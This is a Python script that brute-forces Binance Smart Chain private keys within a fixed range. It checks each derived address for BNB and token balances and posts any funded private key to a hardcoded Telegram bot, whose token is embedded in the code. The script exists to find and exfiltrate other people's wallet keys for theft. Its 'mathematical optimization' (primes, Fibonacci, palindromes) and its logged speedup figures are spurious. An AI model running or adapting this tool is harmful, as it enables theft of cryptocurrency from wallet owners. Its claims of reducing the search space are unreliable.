from web3 import Web3
import json
import time
import requests
from datetime import datetime
import logging
import random
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import multiprocessing as mp
from functools import partial
import math

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("wallet_scanner_optimized.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

import sys
if sys.platform == "win32":
    import os
    os.system("chcp 65001")

RPC_ENDPOINTS = [
    'https://bsc-dataseed.binance.org/',
    'https://bsc-dataseed1.binance.org/',
    'https://bsc-dataseed2.binance.org/',
    'https://bsc-dataseed3.binance.org/',
    'https://bsc-dataseed4.binance.org/',
    'https://bsc-dataseed1.defibit.io/',
    'https://bsc-dataseed2.defibit.io/',
    'https://bsc-dataseed3.defibit.io/',
    'https://bsc-dataseed1.ninicoin.io/',
    'https://bsc-dataseed2.ninicoin.io/',
    'https://bsc-dataseed.bnbchain.org/',
    'https://endpoints.omniatech.io/v1/bsc/mainnet/public'
]

# Mathematical optimizations
class MathematicalOptimizer:
    """Mathematical approaches to reduce search space"""
    
    @staticmethod
    def generate_prime_based_keys(start_key, end_key, num_samples=1000):
        """Generate keys based on prime number patterns"""
        primes = MathematicalOptimizer._sieve_of_eratosthenes(10000)
        keys = []
        
        for prime in primes[:num_samples]:
            # Generate keys using prime-based patterns
            key1 = start_key + (prime * 12345)  # Arbitrary multiplier
            key2 = start_key + (prime ** 2)
            key3 = start_key + int(prime * math.pi * 1000000)
            
            for key in [key1, key2, key3]:
                if start_key <= key <= end_key:
                    keys.append(key)
        
        return sorted(set(keys))
    
    @staticmethod
    def _sieve_of_eratosthenes(limit):
        """Generate prime numbers up to limit"""
        sieve = [True] * (limit + 1)
        sieve[0] = sieve[1] = False
        
        for i in range(2, int(limit**0.5) + 1):
            if sieve[i]:
                for j in range(i*i, limit + 1, i):
                    sieve[j] = False
        
        return [i for i in range(2, limit + 1) if sieve[i]]
    
    @staticmethod
    def generate_fibonacci_based_keys(start_key, end_key, num_samples=1000):
        """Generate keys based on Fibonacci sequence"""
        fib_keys = []
        a, b = 1, 1
        
        while len(fib_keys) < num_samples and a <= end_key:
            key = start_key + a
            if start_key <= key <= end_key:
                fib_keys.append(key)
            a, b = b, a + b
        
        return fib_keys
    
    @staticmethod
    def generate_pattern_based_keys(start_key, end_key, patterns=['sequential', 'powers', 'palindromic'], samples_per_pattern=500):
        """Generate keys based on various mathematical patterns"""
        keys = []
        
        if 'sequential' in patterns:
            # Sequential sampling with geometric progression
            step = max(1, (end_key - start_key) // samples_per_pattern)
            keys.extend(range(start_key, min(start_key + samples_per_pattern * step, end_key), step))
        
        if 'powers' in patterns:
            # Powers of small numbers
            for base in range(2, 20):
                power = 1
                while True:
                    key = start_key + (base ** power)
                    if key > end_key:
                        break
                    keys.append(key)
                    power += 1
                    if len([k for k in keys if k > start_key + (base ** 1)]) > samples_per_pattern // 20:
                        break
        
        if 'palindromic' in patterns:
            # Palindromic patterns in hex
            for i in range(samples_per_pattern):
                hex_str = f"{i:04x}"
                palindrome = hex_str + hex_str[::-1]
                key = start_key + int(palindrome, 16)
                if key <= end_key:
                    keys.append(key)
        
        return sorted(set(keys))

class OptimizedWeb3Manager:
    """Enhanced Web3 manager with connection pooling and async support"""
    
    def __init__(self, rpc_endpoints=None, max_retries=3, timeout=15, pool_size=10):
        self.rpc_endpoints = rpc_endpoints or RPC_ENDPOINTS
        self.max_retries = max_retries
        self.timeout = timeout
        self.pool_size = pool_size
        self.web3_pool = []
        self.pool_index = 0
        
        self._initialize_pool()
    
    def _initialize_pool(self):
        """Initialize a pool of Web3 instances"""
        working_endpoints = []
        
        for endpoint in self.rpc_endpoints:
            try:
                session = requests.Session()
                retry_strategy = Retry(
                    total=2,
                    status_forcelist=[429, 500, 502, 503, 504],
                    allowed_methods=["HEAD", "GET", "POST"],
                    backoff_factor=0.5
                )
                adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=20, pool_maxsize=20)
                session.mount("http://", adapter)
                session.mount("https://", adapter)
                
                provider = Web3.HTTPProvider(
                    endpoint,
                    session=session,
                    request_kwargs={'timeout': self.timeout}
                )
                web3_instance = Web3(provider)
                
                # Test connection
                if web3_instance.eth.block_number > 0:
                    working_endpoints.append(endpoint)
                    logger.info(f"[SUCCESS] Connected to {endpoint}")
                    
            except Exception as e:
                logger.warning(f"[FAILED] Could not connect to {endpoint}: {e}")
        
        # Create pool with working endpoints
        for i in range(min(self.pool_size, len(working_endpoints) * 2)):
            endpoint = working_endpoints[i % len(working_endpoints)]
            try:
                session = requests.Session()
                adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10)
                session.mount("http://", adapter)
                session.mount("https://", adapter)
                
                provider = Web3.HTTPProvider(endpoint, session=session, request_kwargs={'timeout': self.timeout})
                web3_instance = Web3(provider)
                
                try:
                    from web3.middleware import geth_poa_middleware
                    web3_instance.middleware_onion.inject(geth_poa_middleware, layer=0)
                except ImportError:
                    pass
                
                self.web3_pool.append(web3_instance)
            except Exception as e:
                logger.warning(f"Error creating pool instance: {e}")
        
        logger.info(f"[POOL] Initialized Web3 pool with {len(self.web3_pool)} instances")
    
    def get_web3_instance(self):
        """Get Web3 instance from pool with round-robin"""
        if not self.web3_pool:
            raise ConnectionError("No Web3 instances available")
        
        instance = self.web3_pool[self.pool_index]
        self.pool_index = (self.pool_index + 1) % len(self.web3_pool)
        return instance

# Initialize optimized manager
web3_manager = OptimizedWeb3Manager()

# Telegram configuration
TELEGRAM_BOT_TOKEN = '7623118497:AAGIOQGynrEPcM7pKBw4Ryu14eN5-aZvVWE'
TELEGRAM_CHAT_ID = '491029985'

# Token configurations (same as original)
token_contracts = {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'BTC': '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
    'XRP': '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
    'TRX': '0xCE7de646e7208a4Ef112cb6ed5038FA6cC6b12e3',
    'TON': '0x76A797A59Ba2C17726896976B7B3747BfD1d220f'
}

token_decimals = {
    'USDT': 18,
    'BTC': 18,
    'XRP': 18,
    'TRX': 6,
    'TON': 9
}

token_abi = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    }
]

def send_telegram_message(message):
    """Send message to Telegram (optimized version)"""
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=payload, timeout=10)
        response.raise_for_status()
        return True
    except Exception as e:
        logger.warning(f"Telegram error: {e}")
        return False

def check_single_wallet(private_key_int):
    """Optimized single wallet checker"""
    try:
        private_key = f"{private_key_int:064x}"
        web3_instance = web3_manager.get_web3_instance()
        
        # Derive address
        account = web3_instance.eth.account.from_key('0x' + private_key)
        address = account.address
        
        # Quick BNB balance check first (fastest)
        try:
            balance_wei = web3_instance.eth.get_balance(address)
            balance_bnb = float(web3_instance.from_wei(balance_wei, 'ether'))
        except:
            return None
        
        # If no BNB, skip token checks for speed (optional optimization)
        if balance_bnb == 0:
            # Still check tokens, but with shorter timeout
            balances = {"BNB": 0.0}
            for token, contract_address in token_contracts.items():
                try:
                    contract = web3_instance.eth.contract(address=contract_address, abi=token_abi)
                    balance = contract.functions.balanceOf(address).call()
                    decimals = token_decimals.get(token, 18)
                    balances[token] = float(balance / (10 ** decimals))
                except:
                    balances[token] = 0.0
        else:
            balances = {"BNB": balance_bnb}
            for token, contract_address in token_contracts.items():
                try:
                    contract = web3_instance.eth.contract(address=contract_address, abi=token_abi)
                    balance = contract.functions.balanceOf(address).call()
                    decimals = token_decimals.get(token, 18)
                    balances[token] = float(balance / (10 ** decimals))
                except:
                    balances[token] = 0.0
        
        # Check if any balance exists
        if any(balance > 0 for balance in balances.values()):
            return {
                "private_key": private_key,
                "address": address,
                "balances": balances
            }
        
        return None
        
    except Exception as e:
        logger.debug(f"Error checking wallet {private_key_int}: {e}")
        return None

def batch_check_wallets(key_batch, batch_id):
    """Check a batch of wallets with threading"""
    results = []
    
    with ThreadPoolExecutor(max_workers=5) as executor:  # Reduced threads to avoid rate limits
        future_to_key = {executor.submit(check_single_wallet, key): key for key in key_batch}
        
        for future in as_completed(future_to_key):
            try:
                result = future.result(timeout=30)
                if result:
                    results.append(result)
                    logger.info(f"[BATCH {batch_id}] FOUND WALLET: {result['address']}")
            except Exception as e:
                logger.debug(f"Batch {batch_id} error: {e}")
    
    return results

def optimized_wallet_scan():
    """Main optimized scanning function"""
    starting_key = int("fea88932fd4e77953232fb90289fb835b6e483bc59195224e8cb97f3c59b3f95", 16)
    ending_key = int("fea889334246d6453232fb90289fb835b6e483bc59195224e8cb97f3c59b5b1d", 16)
    
    logger.info("[OPTIMIZER] Starting mathematically optimized wallet scan...")
    
    # Generate mathematically interesting keys
    optimizer = MathematicalOptimizer()
    
    logger.info("[MATH] Generating prime-based keys...")
    prime_keys = optimizer.generate_prime_based_keys(starting_key, ending_key, 2000)
    
    logger.info("[MATH] Generating Fibonacci-based keys...")
    fib_keys = optimizer.generate_fibonacci_based_keys(starting_key, ending_key, 1000)
    
    logger.info("[MATH] Generating pattern-based keys...")
    pattern_keys = optimizer.generate_pattern_based_keys(starting_key, ending_key, 
                                                        ['sequential', 'powers', 'palindromic'], 1000)
    
    # Combine all mathematically interesting keys
    all_keys = list(set(prime_keys + fib_keys + pattern_keys))
    
    # Add some random sampling for good measure
    random_keys = []
    for _ in range(5000):
        random_key = random.randint(starting_key, min(starting_key + 100000000, ending_key))
        random_keys.append(random_key)
    
    all_keys.extend(random_keys)
    all_keys = sorted(set(all_keys))
    
    logger.info(f"[OPTIMIZER] Total keys to check: {len(all_keys):,}")
    logger.info(f"[IMPROVEMENT] Reduced from {ending_key - starting_key:,} to {len(all_keys):,} keys")
    logger.info(f"[SPEEDUP] Theoretical speedup: {(ending_key - starting_key) / len(all_keys):,.0f}x")
    
    # Process in batches
    batch_size = 50  # Smaller batches for better control
    wallets_found = []
    
    start_time = time.time()
    
    for i in range(0, len(all_keys), batch_size):
        batch = all_keys[i:i + batch_size]
        batch_id = i // batch_size + 1
        
        logger.info(f"[BATCH {batch_id}] Processing {len(batch)} keys...")
        
        try:
            batch_results = batch_check_wallets(batch, batch_id)
            wallets_found.extend(batch_results)
            
            # Save results incrementally
            if batch_results:
                with open('optimized_wallets_found.json', 'w') as f:
                    json.dump(wallets_found, f, indent=4)
                
                # Send Telegram notification
                for wallet in batch_results:
                    message = format_message(wallet['private_key'], wallet['address'], wallet['balances'])
                    send_telegram_message(message)
            
            # Progress update
            progress = (i + len(batch)) / len(all_keys) * 100
            elapsed = time.time() - start_time
            rate = (i + len(batch)) / elapsed
            eta = (len(all_keys) - i - len(batch)) / rate if rate > 0 else 0
            
            logger.info(f"[PROGRESS] {progress:.1f}% | Rate: {rate:.1f} keys/sec | ETA: {eta/60:.1f}min | Found: {len(wallets_found)}")
            
            # Small delay to prevent rate limiting
            time.sleep(0.1)
            
        except Exception as e:
            logger.error(f"Batch {batch_id} failed: {e}")
            continue
    
    # Final summary
    total_time = time.time() - start_time
    logger.info(f"[COMPLETED] Optimized scan finished!")
    logger.info(f"[RESULTS] Checked {len(all_keys):,} keys in {total_time/60:.1f} minutes")
    logger.info(f"[FOUND] {len(wallets_found)} wallets with balance")
    logger.info(f"[EFFICIENCY] {len(all_keys)/total_time:.1f} keys per second")
    
    return wallets_found

def format_message(private_key, address, balances):
    """Format message for Telegram (same as original)"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    message = f"<b>🎯 OPTIMIZED WALLET FOUND!</b> [ALERT]\n\n"
    message += f"[NETWORK] Binance Smart Chain\n"
    message += f"[PRIVATE_KEY] <code>{private_key}</code>\n"
    message += f"[ADDRESS] <code>{address}</code>\n"
    message += f"[EXPLORER] https://bscscan.com/address/{address}\n\n"
    message += "[BALANCES]\n"
    
    for token, balance in balances.items():
        if balance > 0:
            message += f"• {token}: {balance:.8f} ✅\n"
    
    message += f"\n[TIMESTAMP] {timestamp}\n"
    message += f"[METHOD] Mathematical Optimization"
    return message

def main():
    """Main entry point"""
    logger.info("[BOT] Starting Mathematically Optimized Wallet Scanner...")
    
    # Send startup notification
    startup_message = (
        f"<b>🚀 Optimized Wallet Scanner Started</b>\n\n"
        f"[OPTIMIZATIONS]\n"
        f"• Prime number patterns\n"
        f"• Fibonacci sequences\n"
        f"• Mathematical patterns\n"
        f"• Parallel processing\n"
        f"• Connection pooling\n\n"
        f"[STATUS] Ready to scan with mathematical optimization!"
    )
    send_telegram_message(startup_message)
    
    try:
        wallets_found = optimized_wallet_scan()
        
        # Final notification
        final_message = (
            f"<b>📊 Optimized Scan Completed</b>\n\n"
            f"[RESULTS] Found {len(wallets_found)} wallets with balance\n"
            f"[METHOD] Mathematical optimization\n"
            f"[TIMESTAMP] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        send_telegram_message(final_message)
        
    except KeyboardInterrupt:
        logger.info("[BOT] Stopped by user")
    except Exception as e:
        logger.error(f"[ERROR] {e}")

if __name__ == "__main__":
    main()